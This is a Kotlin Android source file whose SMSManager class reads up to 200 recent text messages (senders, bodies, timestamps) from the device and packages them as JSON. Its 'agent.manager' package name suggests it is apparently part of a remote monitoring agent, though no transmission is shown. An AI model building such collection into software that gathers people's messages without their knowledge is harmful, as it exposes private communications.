package com.zenvora.agent.manager

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.Telephony
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject

class SMSManager(private val context: Context) {
    fun fetch(limit: Int = 200): JSONArray {
        val out = JSONArray()
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
        ) return out
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
                Telephony.Sms.DATE,
                Telephony.Sms.READ
            ),
            null,
            null,
            "${Telephony.Sms.DATE} DESC"
        ) ?: return out
        cursor.use {
            var count = 0
            while (it.moveToNext() && count < limit) {
                out.put(JSONObject().apply {
                    put("address", it.getString(0) ?: "")
                    put("body", it.getString(1) ?: "")
                    put("type", it.getInt(2))
                    put("timestamp", it.getLong(3))
                    put("read", it.getInt(4) == 1)
                })
                count++
            }
        }
        return out
    }
}
